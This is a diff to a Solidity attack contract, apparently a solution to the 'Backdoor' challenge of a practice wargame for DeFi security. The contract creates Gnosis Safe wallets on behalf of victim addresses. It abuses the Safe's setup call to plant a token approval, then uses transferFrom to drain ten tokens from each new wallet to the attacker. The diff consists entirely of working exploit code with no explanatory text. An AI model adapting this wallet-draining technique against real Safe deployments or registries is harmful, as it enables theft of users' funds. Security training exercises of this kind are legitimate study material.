@@ -3,9 +3,11 @@ pragma solidity 0.8.12;
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";
 import {WalletRegistry} from "./WalletRegistry.sol";
 import {BackDoorModule} from "./BackDoorModule.sol";
 import "../DamnValuableToken.sol";
+import "forge-std/Test.sol";
 
 // Your contract
 contract WalletCreator {
@@ -21,7 +23,7 @@ contract WalletCreator {
 
     BackDoorModule private _backdoormodule;
 
-    address[] private _victims;
+    address[] public _victims;
 
     address immutable attacker;
 
@@ -43,8 +45,8 @@ contract WalletCreator {
         attacker = attacker_;
     }
 
-    function setupAllowance() external {
-        DamnValuableToken(paymentToken).approve(attacker, 10 ether);
+    function setupAllowance(address _attacker) external {
+        DamnValuableToken(paymentToken).approve(address(_attacker), 10 ether);
     }
 
     // Safes created via the official interfaces use the DefaultCallbackHandler as their fallback handler.
@@ -52,21 +54,27 @@ contract WalletCreator {
     // (respecting threshold and owners of the Safe).
     function createGnosisSafeWallet() public {
         uint256 counter = 0;
-        bytes memory data = abi.encodeWithSignature("setupAllowance()");
+        bytes memory data = abi.encodeWithSignature(
+            "setupAllowance(address)",
+            address(this)
+        );
+
         for (counter; counter < _victims.length; counter++) {
+            address user = _victims[counter];
+            address[] memory victim = new address[](1);
+            victim[0] = user;
             //  await safe.setup([user1.address, user2.address], 1, AddressZero, "0x", handler.address, AddressZero, 0, AddressZero)
             bytes memory initializer = abi.encodeWithSignature(
                 "setup(address[],uint256,address,bytes,address,address,uint256,address)",
-                _victims[counter],
+                victim,
                 MAX_THRESHOLD,
                 address(this),
                 data,
                 address(0),
                 address(0),
-                0,
+                uint256(0),
                 address(0)
             );
-
             // Create a unique nonce for the proxy contract
             uint256 saltNonce = uint256(
                 keccak256(abi.encodePacked(block.timestamp, msg.sender))
@@ -79,8 +87,14 @@ contract WalletCreator {
                     address(gnosisSafeMasterCopy), // The singleton contract
                     initializer, // The initializer data
                     saltNonce, // The nonce
-                    walletRegistry // The callback contract
+                    IProxyCreationCallback(walletRegistry) // The callback contract
                 );
+
+            DamnValuableToken(paymentToken).transferFrom(
+                address(proxy),
+                attacker,
+                10 ether
+            );
         }
     }
 }
